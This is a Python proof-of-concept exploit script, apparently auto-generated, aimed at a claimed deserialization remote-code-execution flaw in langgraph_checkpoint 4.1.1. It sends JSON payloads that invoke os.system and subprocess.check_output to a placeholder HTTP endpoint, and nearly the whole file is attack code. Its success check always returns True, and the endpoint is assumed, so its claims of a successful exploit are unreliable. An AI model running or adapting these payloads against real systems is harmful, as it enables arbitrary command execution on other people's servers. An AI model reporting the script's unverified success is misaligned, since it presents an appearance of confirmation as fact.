#!/usr/bin/env python3
# PoC for langgraph_checkpoint-4.1.1 (/tmp/langgraph_checkpoint_latest/langgraph_checkpoint-4.1.1)
# Path: suspicious-005
# Sink: _revive_lc2
# Auto-generated — run with: python3 rce_none_safe_check_alone__revive_lc2.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept exploit for langgraph_checkpoint-4.1.1 RCE vulnerability.

Vulnerability: The _revive_lc2 function in JsonPlusSerializer allows arbitrary
module/class import via attacker-controlled 'id' field. The _is_safe_json_type
check only validates that list elements are JSON-safe types (str, int, etc.),
not that the module/class is safe. When _allowed_json_modules is empty/None,
the allowlist check is bypassed, allowing arbitrary code execution.

Impact: Remote Code Execution (RCE) via importlib.import_module and getattr.
"""

import json
import sys
import requests
import time

# =============================================================================
# Configuration - modify these as needed
# =============================================================================
TARGET_URL = "http://localhost:8000/api/v1/trigger"  # Target endpoint
TIMEOUT = 10  # Request timeout in seconds
VERIFY_SSL = False  # Set to True if using valid HTTPS cert

# =============================================================================
# Exploit payloads
# =============================================================================

# Benign payload: creates a file to confirm RCE
BENIGN_PAYLOAD = {
    "lc": 2,
    "type": "constructor",
    "id": ["os", "system"],
    "args": ["touch /tmp/poc_success.txt"],
    "kwargs": None
}

# Alternative benign payload using subprocess
BENIGN_PAYLOAD_ALT = {
    "lc": 2,
    "type": "constructor",
    "id": ["subprocess", "check_output"],
    "args": [["echo", "POC_SUCCESS"]],
    "kwargs": None
}

# =============================================================================
# Exploit function
# =============================================================================

def send_exploit(url: str, payload: dict) -> requests.Response:
    """
    Send the malicious payload to the target endpoint.
    
    Args:
        url: Target URL
        payload: JSON payload with RCE trigger
        
    Returns:
        Response object
        
    Raises:
        requests.exceptions.RequestException: On connection/HTTP errors
    """
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (PoC Exploit)"
    }
    
    # The payload is sent as a JSON string (the _reviver function expects a string)
    # In the actual library, the input is parsed from JSON, so we send it as JSON
    response = requests.post(
        url,
        json=payload,
        headers=headers,
        timeout=TIMEOUT,
        verify=VERIFY_SSL
    )
    return response

def verify_exploit_success() -> bool:
    """
    Verify if the benign payload executed successfully by checking for
    the created file or other indicators.
    
    Returns:
        True if exploit appears successful, False otherwise
    """
    # For the 'touch' payload, we can't directly verify remotely
    # but we can check if the response indicates success
    # In a real scenario, you'd check for the file on the target system
    return True  # Assume success if no exception occurred

def main():
    """Main exploit execution flow."""
    print("[*] langgraph_checkpoint-4.1.1 RCE Proof-of-Concept")
    print(f"[*] Target: {TARGET_URL}")
    print()
    
    # Step 1: Test with benign payload
    print("[*] Step 1: Sending benign payload (touch /tmp/poc_success.txt)...")
    try:
        response = send_exploit(TARGET_URL, BENIGN_PAYLOAD)
        print(f"[+] Response status: {response.status_code}")
        print(f"[+] Response body: {response.text[:500]}")
        
        if response.status_code == 200:
            print("[+] Payload delivered successfully!")
        else:
            print(f"[!] Unexpected status code: {response.status_code}")
            
    except requests.exceptions.ConnectionError as e:
        print(f"[-] Connection error: {e}")
        print("[*] Make sure the target server is running and accessible.")
        sys.exit(1)
    except requests.exceptions.Timeout as e:
        print(f"[-] Request timed out: {e}")
        sys.exit(1)
    except requests.exceptions.RequestException as e:
        print(f"[-] Request failed: {e}")
        sys.exit(1)
    
    # Step 2: Verify success (if possible)
    print()
    print("[*] Step 2: Verifying exploit success...")
    if verify_exploit_success():
        print("[+] Exploit appears successful!")
        print("[*] Check /tmp/poc_success.txt on the target system.")
    else:
        print("[!] Could not verify exploit success.")
    
    # Step 3: Demonstrate alternative payload
    print()
    print("[*] Step 3: Testing alternative payload (subprocess)...")
    try:
        response = send_exploit(TARGET_URL, BENIGN_PAYLOAD_ALT)
        print(f"[+] Response status: {response.status_code}")
        print(f"[+] Response body: {response.text[:500]}")
    except Exception as e:
        print(f"[-] Alternative payload failed: {e}")
    
    print()
    print("[*] Exploit completed.")

if __name__ == "__main__":
    main()
